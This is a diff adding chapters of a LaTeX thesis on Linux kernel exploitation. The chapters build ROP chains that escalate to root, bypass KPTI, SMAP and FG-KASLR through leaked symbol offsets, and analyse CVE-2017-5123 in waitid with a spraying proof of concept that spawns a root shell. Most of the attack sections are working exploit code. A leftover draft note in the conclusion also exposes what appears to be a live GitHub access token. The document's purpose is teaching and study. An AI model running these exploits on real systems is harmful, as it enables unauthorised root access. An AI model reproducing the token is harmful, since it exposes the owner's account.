+    payload[off++] = 0x0; // rbx
+    payload[off++] = 0x0; // r12
+    payload[off++] = 0x0; // rbp
+    payload[off++] = pop_rdi_ret; // return address
+    payload[off++] = 0x0; // rdi <- 0
+    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
+    payload[off++] = pop_rdx_ret;
+    payload[off++] = 0x8; // rdx <- 8
+    payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE does not branch
+    payload[off++] = 0x0; // dummy rbx
+    payload[off++] = 0x0; // dummy rbp
+    payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
+    payload[off++] = 0x0; // dummy rbx
+    payload[off++] = 0x0; // dummy rbp
+    payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
+    payload[off++] = swapgs_pop1_ret; // swapgs
+    payload[off++] = 0x0; // dummy rbp
+    payload[off++] = iretq; // iretq frame
+    payload[off++] = user_rip;
+    .....
+}
+
+\end{lstlisting}
+\section{Adding KPTI}
+\label{sect:trampoline}
+As mentioned in \refToSubSection{KPTI} the user-space and kernel-space page tables are separate. In fact, in user mode, a page set includes user-space page tables and only a few kernel-space addresses.
+There are several ways to bypass this mitigation, but the one we are going to look at is called a \emph{trampoline}.
+Logically if a system call returns normally there must be a piece of code in the kernel that swaps the page tables to the userland, so we will try to reuse that code for our purpose.
+This piece of code is called a trampoline and swaps the page tables, swapgs, and iretq.
+\subsection{Tweaking the ROP chain}
+The piece of code resides in a function called \lstinline{swapgs_restore_regs_and_return_to_usermode()} which we always find with \lstinline{/proc/kallsyms}.
+\begin{lstlisting}
+.text:FFFFFFFF81200F10                 pop     r15
+...
+.text:FFFFFFFF81200F26                 mov     rdi, rsp
+.text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004
+.text:FFFFFFFF81200F32                 push    qword ptr [rdi+30h]
+.text:FFFFFFFF81200F35                 push    qword ptr [rdi+28h]
+.text:FFFFFFFF81200F38                 push    qword ptr [rdi+20h]
+.text:FFFFFFFF81200F3B                 push    qword ptr [rdi+18h]
+.text:FFFFFFFF81200F3E                 push    qword ptr [rdi+10h]
+.text:FFFFFFFF81200F41                 push    qword ptr [rdi]
+.text:FFFFFFFF81200F43                 push    rax
+.text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89
+...
+
+.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:
+.text:FFFFFFFF81200F89                               pop     rax
+.text:FFFFFFFF81200F8A                               pop     rdi
+.text:FFFFFFFF81200F8B                               call    cs:off_FFFFFFFF82040088
+.text:FFFFFFFF81200F91                               jmp     cs:off_FFFFFFFF82040080
+\end{lstlisting}
+Up to the address FFFFFFFF81200F26 the function makes a series of pop that free the stack, then you get to the part that swaps the tables of the page.
+We will have two extra pop at the beginning, then we will add two dummy values, and we will modify the final part of our ROP chain from \lstinline{SWAPGS|IRETQ|RIP|CS|RFLAGS|SP|SS)} to \lstinline{KPTI_trampoline|dummy RAX|dummy RDI|RIP|CS|RFLAGS|SP|SS}.
+\begin{lstlisting}
+void overflow(void){
+    // ...
+    payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
+    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    payload[off++] = 0x0; // dummy rax
+    payload[off++] = 0x0; // dummy rdi
+    payload[off++] = user_rip;
+    payload[off++] = user_cs;
+    payload[off++] = user_rflags;
+    payload[off++] = user_sp;
+    payload[off++] = user_ss;
+    // ...
+\end{lstlisting}
+This solution can be used regardless of whether KPTI is enabled or not.
+So, even if different from the one seen in \refToSubSection{second scenario}, it can be used to bypass the SMEP.
+\section{Adding SMAP}
+This feature marks all the userland pages in the page table as non-accessible when the process is in kernel-mode, which means they cannot be read or written.
+In the kernel, this is enabled by setting the 21st bit of Control Register CR4.
+If we consider \refToSubSection{CR4}, the idea of having the entire ROP chain in the kernel stack also works to bypass SMAP.
+The pivoting technique seen in \refToSubSection{second scenario} is not effective because the stack push and pop operations require read and write access and SMAP does not allow this. The primitives of writing and reading from the stack seen so far do not allow for a successful exploit. So we need more primitives.
+\section{Adding KASLR and FG-KASLR}
+With KASLR active, as ASLR in user-land, the base address on which the kernel image is loaded is randomized each time the system is booted.
+To overcome this problem in the user-land we leak an address in the section, we calculate the base address of the section from it and then all the other addresses will only be moved from there because the only randomized thing is the base address, while the offset remains unchanged.
+Theoretically, this should be the same for KASLR, but booting the system several times and reading \emph{/proc/kallsyms} shows that most of the symbols are randomized by themselves, without having a constant offset like in user-land.
+This is due to FG-KASRL reorganizing the kernel code at load time on a per-function level.
+In theory, if everything in the kernel is completely randomized, it will be nearly impossible for us to collect useful gadgets from the kernel image. But such mitigation functionality still suffers from weaknesses and thus a successful exploit is still possible.
+\subsection{Gathering useful gadgets}
+This mitigation not being perfect presents regions within the code that are never randomized.
+This differs from kernel to kernel. For example, here are several functions that are never randomized:
+\begin{lstlisting}
+/ # grep __x86_retpoline_r15 /proc/kallsyms
+ffffffffbce00dc6 T __x86_retpoline_r15
+/ # grep _text /proc/kallsyms  | head -1
+ffffffffbca00000 T _text
+/ # grep swapgs_restore_regs_and_return_to_usermode /proc/kallsyms 
+ffffffffbcc00f10 T swapgs_restore_regs_and_return_to_usermode
+/ # grep ksymtab /proc/kallsyms | head -1
+ffffffffbd985198 R __start___ksymtab 
+
+/ # grep __x86_retpoline_r15 /proc/kallsyms
+ffffffff8ea00dc6 T __x86_retpoline_r15
+/ # grep _text /proc/kallsyms  | head -1
+ffffffff8e600000 T _text
+/ # grep swapgs_restore_regs_and_return_to_usermode /proc/kallsyms 
+ffffffff8e800f10 T swapgs_restore_regs_and_return_to_usermode
+/ # grep ksymtab /proc/kallsyms | head -1
+ffffffff8f585198 R __start___ksymtab
+
+/ #  grep __x86_retpoline_r15 /proc/kallsyms
+ffffffffaa000dc6 T __x86_retpoline_r15
+/ # grep _text /proc/kallsyms  | head -1
+ffffffffa9c00000 T _text
+/ # grep swapgs_restore_regs_and_return_to_usermode /proc/kallsyms 
+ffffffffa9e00f10 T swapgs_restore_regs_and_return_to_usermode
+/ # grep ksymtab /proc/kallsyms | head -1
+ffffffffaab85198 R __start___ksymtab
+\end{lstlisting}
+
+\begin{figure}[h!]
+   \makebox[\textwidth][c]{\includegraphics[height=0.61
+  \textwidth]{images/findAddressToImageBase.png}}
+   \caption{Find address in the stack in no randomize region}
+   \label{address_graphview}
+\end{figure}
+
+
+
+\texttt{\lstinline{__ x86_retpoline_r15}, \lstinline{swapgs_restore_regs_and_return_to_usermode}, \lstinline{ksymtab}} are never randomized with respect to \lstinline{\_text}, and in particular both \lstinline{commit\_creds} and \lstinline{prepare_kernel_cred} keep the same offset inside \lstinline{ksymtab}.
+To find the base image instead, you need to inspect the stack when reading the module, look at a large amount of data and find an address located in the \lstinline{_text} region.
+Reading 320 bytes, we find at 304th byte an address that falls in the region of \lstinline{_text}. From that value, we subtract the address of \lstinline{_text} and find the base image.
+From there we calculate the various offsets with the functions not affected by FG\_KASLR:
+\begin{lstlisting}
+void leak(void){
+    unsigned n = 40;
+    unsigned long leak[n];
+    ssize_t r = read(global_fd, leak, sizeof(leak));
+    cookie = leak[16];
+    image_base = leak[38] - 0xa157ULL;
+    kpti_trampoline = image_base + 0x200f10UL + 22UL;
+    pop_rax_ret = image_base + 0x4d11UL;
+    read_mem_pop1_ret = image_base + 0x4aaeUL;
+    pop_rdi_rbp_ret = image_base + 0x38a0UL;
+    ksymtab_prepare_kernel_cred = image_base + 0xf8d4fcUL;
+    ksymtab_commit_creds = image_base + 0xf87d90UL;
+    ........
+}
+\end{lstlisting}
+From here on we have 4 stages:
+\begin{enumerate}
+\item Leaking commit\_creds();
+\item Leaking prepare\_kernel\_cred();
+\item Calling prepare\_kernel\_cred(0);
+\item Calling commit\_creds() and opening root shell;
+\end{enumerate}
+\subsection{Leaking commit\_creds and prepare\_kernel\_cred()}
+The goal is to leak \lstinline{commit_creds()} and read the value\_offset of \lstinline{ksymtab_commit_creds}, then add them together. We will use our 2 memory reading gadgets to read it, using the ROP technique introduced in \refToSection{trampoline}, and safely return to the user-land via the KPTI trampoline to prepare for the next step.
+\begin{lstlisting}
+void stage_1(void){
+    unsigned n = 50;
+    unsigned long payload[n];
+    unsigned off = 16;
+    payload[off++] = cookie;
+    payload[off++] = 0x0; // rbx
+    payload[off++] = 0x0; // r12
+    payload[off++] = 0x0; // rbp
+    payload[off++] = pop_rax_ret; // return address
+    payload[off++] = ksymtab_commit_creds - 0x10; // rax <- __ksymtabs_commit_creds - 0x10
+    payload[off++] = read_mem_pop1_ret; // rax <- [__ksymtabs_commit_creds]
+    payload[off++] = 0x0; // dummy rbp
+    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    payload[off++] = 0x0; // dummy rax
+    payload[off++] = 0x0; // dummy rdi
+    payload[off++] = (unsigned long)get_commit_creds;
+    ....
+}
+void get_commit_creds(void){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov tmp_store, rax;"
+        ".att_syntax;"
+    );
+    commit_creds = ksymtab_commit_creds + (int)tmp_store;
+    printf("    --> commit_creds: %lx\n", commit_creds);
+    stage_2();
+}
+\end{lstlisting}
+Second stageis exactly the same as stage 1:
+\begin{lstlisting}
+void stage_2(void){
+    ...
+    //the same as 1 stage
+    ...
+    payload[off++] = ksymtab_prepare_kernel_cred - 0x10; // rax <- __ksymtabs_prepare_kernel_cred - 0x10
+    payload[off++] = read_mem_pop1_ret; // rax <- [__ksymtabs_prepare_kernel_cred]
+    payload[off++] = 0x0; // dummy rbp
+    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    payload[off++] = 0x0; // dummy rax
+    payload[off++] = 0x0; // dummy rdi
+    payload[off++] = (unsigned long)get_prepare_kernel_cred;
+    ....
+}
+
+void get_prepare_kernel_cred(void){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov tmp_store, rax;"
+        ".att_syntax;"
+    );
+    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)tmp_store;
+    printf("    --> prepare_kernel_cred: %lx\n", prepare_kernel_cred);
+    stage_3();
+}
+
+\end{lstlisting}
+\subsection{Calling commit\_creds(prepare\_kernel\_cred(0))}
+Since the number of gadgets is limited, it was impossible to find a ROP chain calling \lstinline{commit_creds(prepare_kernel_cred(0))}.
+The only solution is to divide the chain into two parts:
+\begin{itemize}
+  \item Call \lstinline{prepare_kernel_cred (0)} function saving the return value in \emph{rax}.
+   \item Call \lstinline{commit_creds ()} function using the value we have in \emph{rax}.
+\end{itemize}
+This way we bypass a fairly difficult part of the ROP chain, move the value received from \lstinline{prepare_kernel_cred(0)} from \emph{rax} to \emph{rdi} and pass it to the \lstinline{commit_creds()} function.
+\begin{lstlisting}
+void stage_3(void){
+    ...
+    //As stage 1
+    ...
+    payload[off++] = pop_rdi_rbp_ret; // return address
+    payload[off++] = 0; // rdi <- 0
+    payload[off++] = 0; // dummy rbp
+    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
+    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    payload[off++] = 0x0; // dummy rax
+    payload[off++] = 0x0; // dummy rdi
+    payload[off++] = (unsigned long)after_prepare_kernel_cred;
+    payload[off++] = user_cs;
+    payload[off++] = user_rflags;
+    payload[off++] = user_sp;
+    payload[off++] = user_ss;
+    ...
+}
+
+void after_prepare_kernel_cred(void){
+    __asm__(
+        ".intel_syntax noprefix;"
+        "mov tmp_store, rax;"
+        ".att_syntax;"
+    );
+    returned_creds_struct = tmp_store;
+    printf("    --> returned_creds_struct: %lx\n", returned_creds_struct);
+    stage_4();
+}
+
+void stage_4(void){
+    ...
+    //As stage 3
+    ...
+    payload[off++] = returned_creds_struct; // rdi <- returned_creds_struct
+    payload[off++] = 0; // dummy rbp
+    payload[off++] = commit_creds; // commit_creds(returned_creds_struct)
+    payload[off++] = kpti_trampoline; // swapgs_restore_regs_and_return_to_usermode + 22
+    payload[off++] = 0x0; // dummy rax
+    payload[off++] = 0x0; // dummy rdi
+    payload[off++] = (unsigned long)get_shell;
+    payload[off++] = user_cs;
+    payload[off++] = user_rflags;
+    payload[off++] = user_sp;
+    payload[off++] = user_ss;
+
+    puts("[*] Prepared payload to call commit_creds(returned_creds_struct)");
+    ssize_t w = write(global_fd, payload, sizeof(payload));
+}
+\end{lstlisting} 
+\chapter{Kernel exploitation - CVE-2017-5123}
+\label{ch:cve-2017}
+In this chapter we analyze a real bug within the linux kernel that allows you to get a root shell by performing a \emph{Local Privilege Escalation}~\cite{farah2017study}.
+\section{Background}
+\label{sect:back-cve-2017}
+When handling system calls, the kernel must be able to read and write to the memory of the process that invoked the call. To do this, the kernel has special functions such as \lstinline{copy_from_user} \refToSubSection{hackme}, \lstinline{put_user} and others, which copy data to or from the user area.
+
+Broadly speaking, the put_user should do the following:
+\begin{lstlisting}
+put_user(x, void __user *ptr)
+if (access_ok(VERIFY_WRITE, ptr, sizeof(*ptr)))
+    return -EFAULT
+user_access_begin()
+*ptr = x
+user_access_end()
+}
+\end{lstlisting}
+The \lstinline{access_ok(...)} function checks that the pointer is in the userland and not the kernel and, if so, disables SMAP via \lstinline{user_access_begin} so that the kernel accesses the user area. Once the kernel has been written, SMAP is re-enabled.
+
+The \texttt{user_access_begin} function allows direct data access in supervisor mode to user mode pages even if the SMAP bit is set in the \emph{CR4 register}.
+
+The \texttt{user_access_end} function prevents explicit supervisor mode data access to user mode pages if the SMAP bit is set in \emph{CR4 register}.
+\section{The Vulnerability}
+\label{sect:vulnerability_17}
+In the 4.13 kernel version, analyzing the \texttt{waitid} ~\cite{waitid} system call inside the \texttt{/kernel/exit.c} file shows the presence of a bug.
+\begin{lstlisting}
+SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
+                                  infop, int, options, struct rusage __user *, ru)
+{
+    struct rusage r;
+    struct waitid_info info = {.status = 0};
+    long err = kernel_waitid(which, upid, &info, options, ru ? &r : NULL);
+    int signo = 0;
+
+    if (err > 0) {
+        signo = SIGCHLD;
+        err = 0;
+        if (ru && copy_to_user(ru, &r, sizeof(struct rusage)))
+            return -EFAULT;
+        }
+        if (!infop)
+            return err;
+
+        user_access_begin();
+        unsafe_put_user(signo, &infop->si_signo, Efault);    <-    no access_ok call
+        unsafe_put_user(0, &infop->si_errno, Efault);
+        unsafe_put_user(info.cause, &infop->si_code, Efault);
+        unsafe_put_user(info.pid, &infop->si_pid, Efault);
+        unsafe_put_user(info.uid, &infop->si_uid, Efault);
+        unsafe_put_user(info.status, &infop->si_status, Efault);
+        user_access_end();
+        return err;
+Efault:
+        user_access_end();
+        return -EFAULT;
+}
+\end{lstlisting}
+Quite often some system calls require many calls to \texttt{put/get_user} to copy data between the kernel and user area.
+
+To avoid further repeated checks and enabling/disabling of SMAP, the kernel developers have introduced \emph{``unsafe"} versions: \texttt{unsafe_put/get_user} which do not provide checks.
+In reality, they are not \emph{``insecure"}, but to use them most appropriately, it is necessary to call \texttt{access\_ok} and \emph{``wrap"} everything between the \texttt{user_access_begin/end()} functions.
+
+
+During the development phase, as can be seen from the code above, the \texttt{access_ok} control is missing.
+This lack leads to an arbitrary write since the \textit{infop} pointer is completely controlled by the attacker allowing, therefore, to write values in an arbitrary address.
+
+\subsection{Analyzing the system call}
+\label{subsect:waitid}
+
+Going to the system manual pager \emph{``man''} ~\cite{torvalds2002linux} the function \texttt{int waitid (idtype_t idtype, id_t id, siginfo_t * infop, int options)}, which waits for a child process changes state, has four parameters.
+
+The \textit{idtype} and \textit {id} arguments are used to specify which children waitid () should wait for.
+
+If \textit{idtype} matches P\_PID, the function waits for the child with id equal to \textit{id}.
+If \textit{idtype} matches P\_PGID, the function expects any child with group id equal to \textit{id}.
+If \textit{idtype} matches P\_ALL, the function expects any child and \textit{id} is ignored.
+The \textit{infop} data corresponds to a very complex data structure:
+
+\begin{lstlisting}
+typedef struct {
+  int si_signo;
+  int si_code;
+  union sigval si_value;
+  int si_errno;
+  pid_t si_pid;
+  uid_t si_uid;
+  void *si_addr;
+  int si_status;
+  int si_band;
+} siginfo_t;
+\end{lstlisting}
+Specifically, we are interested in the \textit{uid\_t si\_uid} data which corresponds to the uid \refToSubSection{proc_trhreads} of the process under consideration.  
+The \textit{options} parameter is used to specify which state change the \texttt{waitid} function should wait.
+
+\subsection{Process, threads and user rights}
+\label{subsect:proc_trhreads}
+A \emph{UID} (user identifier) is a number assigned by Linux and different for each user on the system you are using.
+It is used to identify the user on the system and to determine which system resources, such as files and folders, the user can access.
+The root user has the UID set to 0. Usually, new users of the system are assigned a number between 500 and 1000.
+The UID of a process is saved in a data structure called \texttt{struct cred}.
+
+
+\subsection{How the system call works}
+\label{subsect:how_waitid}
+
+To understand what the \texttt{waitid} function does, I applied the same to a \textit{signinfo\_t} variable in a C file, assigned sensible values to the variable and displayed what it contains before and after the call to the system call.
+
+\begin{lstlisting}
+int main(){
+  int p;
+  int uid;
+  int err;
+  siginfo_t test;
+  if (fork()==0){
+        p = getpid();
+        uid = syscall(__NR_getuid);
+        sleep(5);
+        test.si_signo = 1234;
+        test.si_code = SIGILL;
+        test.si_errno = 56;
+        test.si_pid = p;
+        test.si_uid = uid;
+        printf("Address test %x\n",&test);
+        printf("si_signo %d\n",test.si_signo);
+        printf("si_errno %d\n",test.si_errno);
+        printf("si_code %d\n",test.si_code);
+        printf("si_pid %d\n",test.si_pid);
+        printf("si_uid %d\n",test.si_uid);
+        printf("si_status %d\n",test.si_status);
+        printf("si_addr %x\n\n",test.si_addr);
+        err = syscall(__NR_waitid, P_PID, p, &test, WEXITED, NULL);
+        //err = waitid(P_PID, p, &test, WEXITED, NULL);
+        printf("After waitid \n");
+        printf("si_signo %d\n",test.si_signo);
+        printf("si_errno %d\n",test.si_errno);
+        printf("si_code %d\n",test.si_code);
+        printf("si_pid %d\n",test.si_pid);
+        printf("si_uid %d\n",test.si_uid);
+        printf("si_status %d\n",test.si_status);
+        printf("si_addr %x\n\n",test.si_addr);
+  }
+\end{lstlisting}
+\begin{figure}[h!]
+\caption{Before and after using the waitid function applied to a variable in userspace. As we can see it clears all the fields of the data structure.}
+   \makebox[\textwidth][c]{\includegraphics[height=0.65
+  \textwidth]{images/how-waitid-works.png}}
+   \label{waitid_show}
+\end{figure} 
+
+The value of \textit{si\_uid} set to 0 \vtnote{use 0 or zero?} After the function call, thus in a hypothetical scenario where the attacker is able to manipulate this structure, he will get for the process corresponding to its root privileges.
+
+\section{Verify the bug}
+\label{sect:bug}
+
+
+Using the configuration for the Kernel seen in the \refToSection{configuration}, \emph{GDB}, seen in the \refToSubSection{gdb}, and the QEMU configuration seen in the \refToSubSection{QEMU}, it is possible to show how a local privilege escalation \emph{LPE} can be achieved.
+
+
+
+\subsection{Python inside GDB}
+\label{subsect:py_gdb}
+
+By connecting to the virtual machine made ad hoc with QEMU we can see the activities in progress within the system with the command \texttt{lx-ps}.
+This command shows the starting address that an activity occupies within the stack, the progressive number of activities corresponding to the activity and the name of the same.
+Using GDB with a Python program we can take advantage of the commands provided by the kernel for debugging.
+
+\begin{lstlisting}
+import os, tempfile
+import gdb
+
+class CachedType:
+    def __init__(self, name):
+        self._type = None
+        self._name = name
+
+    def _new_objfile_handler(self, event):
+        self._type = None
+        gdb.events.new_objfile.disconnect(self._new_objfile_handler)
+
+    def get_type(self):
+        if self._type is None:
+            self._type = gdb.lookup_type(self._name)
+            if self._type is None:
+                raise gdb.GdbError(
+                    "cannot resolve type '{0}'".format(self._name))
+            if hasattr(gdb, 'events') and hasattr(gdb.events, 'new_objfile'):
+                gdb.events.new_objfile.connect(self._new_objfile_handler)
+        return self._type
+
+
+long_type = CachedType("long")
+
+def get_long_type():
+    global long_type
+    return long_type.get_type()
+
+def offset_of(typeobj, field):
+    element = gdb.Value(0).cast(typeobj)
+    return int(str(element[field].address).split()[0], 16)
+
+def container_of(ptr, typeobj, member):
+    return (ptr.cast(get_long_type()) -
+            offset_of(typeobj, member)).cast(typeobj)
+
+task_type = CachedType("struct task_struct")
+
+v = gdb.lookup_type('struct task_struct').pointer()
+# For KASLR
+#offset = 0xe0f480 + 0xffffffff8a400000
+#addr = gdb.Value(offset)
+#init = addr.cast(v)
+init = gdb.parse_and_eval("init_task").address
+def task_lists():
+    task_ptr_type = task_type.get_type().pointer()
+    t = g = init
+    while True:
+        while True:
+            yield t
+
+            t = container_of(t['thread_group']['next'],
+                               task_ptr_type, "thread_group")
+            if t == g:
+                break
+
+        t = g = container_of(g['tasks']['next'],
+                               task_ptr_type, "tasks")
+        if t == init:
+            return
+# Store the address in a file
+f = open("kasl",'w')
+c = 0
+for task in task_lists():
+    #gdb.write("{address} {pid} {comm}\n".format(address=task,pid=task["pid"],comm=task["comm"].string()))
+    comm = task["comm"].string()
+    name_task = "activity"
+    if comm == name_task:
+        print(task['cred'])
+        f.write(str(task['cred']))
+        f.write("\n")
+f.close()
+
+N.B. To run this program inside GDB we used the command: source -s -v filename.py
+\end{lstlisting}
+
+This program allows you to print the address of the \textit{signinfo\_t} structure relating to the name of the process contained in the \textit{name\_task} variable both on the GDB terminal and within a file.
+
+
+\subsection{LPE with C file}
+\label{subsect:lpe_c}
+
+Having total control of what happens inside the system, it is possible to create a program in C that takes as input the address returned within GDB with the program seen in \refToSubSection{py_gdb} and modify the structure \textit{signinfo\_t} of the process gaining root privileges.
+We will consider as a process the user bash (test) we are in.
+
+\begin{lstlisting}
+int main(){
+  int p;
+  int err;
+  if (fork()==0){
+        p = getpid();
+        unsigned long long addr = 0xffff880176e81600;
+        err = syscall(__NR_waitid, P_PID, p, addr, WEXITED, NULL);
+        //err = waitid(P_PID,p,addr,WEXITED);
+  }
+  return 0;
+}
+\end{lstlisting}
+
+This program creates a fork ~\cite{fork} and inserts the \emph{PID} of the newly created process into the waitid and waits for it to terminate.
+With these few command lines, it is possible to obtain root privileges for the logged-in user.
+
+\begin{figure}[h!]
+\caption{Example of local privilege escalation with GDB, DEBUG of Kernel and C file}
+   \makebox[\textwidth][c]{\includegraphics[height=0.65
+  \textwidth]{images/lpe_with_c.png}}
+   \label{lpe_c}
+\end{figure} 
+
+
+As can be seen from the figure ~\ref{lpe_c}, after the execution of the program the test user obtains root privileges and performs the operations as such.
+By logging out and logging back in with the same user, it is possible to observe how the test user no longer has these privileges.
+
+This happens for a very simple reason: the new test user process has a different position in the stack than the previous session.
+
+
+
+\section{Exploitation}
+\label{sect:exp-cve}   
+ 
+In the \refToSection{vulnerability_17} we have seen how this vulnerability can be exploited to obtain root privileges. In a real attack, we must consider that many techniques used previously are not available to the attacker, therefore it is necessary to find alternative techniques.
+We will then see how to combine everything to obtain a reliable program to perform the exploit.
+
+Making a small recap:
+\begin{itemize}
+   \item We know how to exploit the vulnerability and write to memory;
+   \item We can write 0 to an arbitrary memory address;
+   \item We know what \emph{UIDs} are and that by overriding their value we can escalate privileges.
+\end {itemize}
+
+The only thing missing is knowing the address to overwrite.
+Since even without enabling KASLR we will not be able to have a stable address to write to in memory, a good technique to use is spraying.
+
+\subsection{Spraying}
+\label{subsect:spraying}
+
+Spraying~\cite{ratanaworabhan2009nozzle} can be used to make it easier to exploit a vulnerability. That technique alone cannot be used to break security boundaries: a separate security issue is needed (as in our case).
+
+Spraying takes advantage of the fact that in most architectures and operating systems, the initial position of large heap allocations is predictable and consecutive allocations are roughly sequential.
+Therefore, by creating a large number of structures within the heap, you are more likely to exploit a possible vulnerability.
+
+In our case, it is necessary to identify a range of addresses where the structures are saved.
+To find it, you can create a maximum number of processes for that system and read the addresses of the structures with the program seen in the \refToSubSection{py_gdb}.
+
+We can run a program that creates processes a few times and see how addresses are changed, remembering to shut down the VM completely every time.
+To create enough processes we can use the clone like this:
+\begin{lstlisting}
+stack=malloc(STACK_SIZE)+STACK_SIZE;
+  for(x=0;x<MAX_THREADS;x++){
+    stackTop = malloc(STACK_SIZE) + STACK_SIZE;
+    if (!stackTop){
+      perror("[-] Malloc");
+      return -1;
+    }
+    pid = clone(spray_thread, stackTop, CLONE_VM | CLONE_FS|CLONE_FILES|CLONE_SYSVSEM | SIGCHLD, NULL);
+    if (pid == -1){
+      perror("\n\nCLONE");
+      return -1;
+    }
+    printf("[0] Process created: %d\r", x);
+    }
+\end{lstlisting}
+
+\subsection{Proof of concept}
+\label{subsect:poc}
+
+PoC is not very complex: just create many threads and start overwriting at an arbitrary address. Our threads will only have to "check” their UID and do "something” in case it changes.
+
+Initially we create processes with the piece of code seen in the \refToSubSection{spraying} which all execute the \texttt{spray_thread} function.
+\begin{lstlisting}
+struct shared_area{
+  int one_win;
+};
+struct shared_area glob_var;
+
+// Sprayed thread
+int spray_thread(void *arg){
+  int uid;
+  int previous_one = syscall(__NR_getuid);
+  // Loop over syscall getUID
+  while(1){
+    uid = syscall(__NR_getuid);
+    printf("UID: %d\n",uid);
+    // If returned UID is different from the previous one, then we have hitted a struct cred area
+    if (uid != previous_one){
+      printf("Previous one %d\n" , previous_one);
+      printf("WIN!! with %d", uid);
+      // Kill other treads in order to stabilize the system
+      glob_var.one_win = 1;
+      // Simply spawn a shell
+      system("/bin/sh");
+    }
+    if(glob_var.one_win == 1)
+      return 1;
+  }
+  return 0;
+}
+\end{lstlisting}
+This function checks that the \emph{UID} of the process has not changed. In case it has changed it means that we have overwritten the structure with the system call \texttt{waitid}, then call a shell. In this scenario, this shell should be called with root privileges.
+
+The next step is, after having identified the address range with the \refToSubSection{spraying} method, iterate over that range by advancing 4Kb in an attempt to find the address of a structure saved in the heap.
+\begin{lstlisting}
+int thread_ready;
+void *stack;
+int trigger_bug(uint64_t where, int what){
+  printf("[0] Trying to overwrite 0x%016lx\r", where);
+  int p;
+  
+  thread_ready = what;
+  if (fork()==0){
+    p = getpid();
+    printf("\n\n\npid:%d\n",p);
+    thread_ready=1;
+  }
+  int err;
+  while(thread_ready == 0) {syscall(__NR_sched_yield);}
+  err = syscall(__NR_waitid, P_PID, p, where, WEXITED, NULL);
+  printf("Print the result of the waitid %d \n",err);  
+  return err;
+}
+\end{lstlisting}
+
+This method guarantees, with a probability of 50\%, a local privilege escalation.
+
+\chapter{Conclusion}
+\vtnote{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
+
+QEMU-system-i386 -hda archlinux-i686.img -boot d -cdrom ../archlinux
+.12.01-dual.iso -m 1024
+
+sudo debootstrap --include=vim,openssh-server,isc-dhcp-client  stable /tmp/mount1/ http://deb.debian.org/debian/
+
+source -s -v ...py}
+
+\bibliographystyle{alphaurl}
+\bibliography{bib}
+\end{document}
+
+
+
+
